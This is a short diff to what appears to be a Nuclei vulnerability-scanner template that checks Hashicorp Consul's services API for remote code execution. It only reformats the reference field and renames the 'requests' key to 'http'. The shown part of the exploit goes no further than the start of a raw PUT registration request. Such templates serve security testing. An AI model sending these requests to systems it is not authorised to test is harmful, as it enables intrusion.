@@ -4,11 +4,10 @@ info:
   name: Hashicorp Consul Services Api RCE
   author: pikpikcu
   severity: critical
-  reference:
-    - https://www.exploit-db.com/exploits/46074
+  reference: https://www.exploit-db.com/exploits/46074
   tags: hashicorp,rce,oast,intrusive
 
-requests:
+http:
   - raw:
       - | # Create USER
         PUT /v1/agent/service/register HTTP/1.1
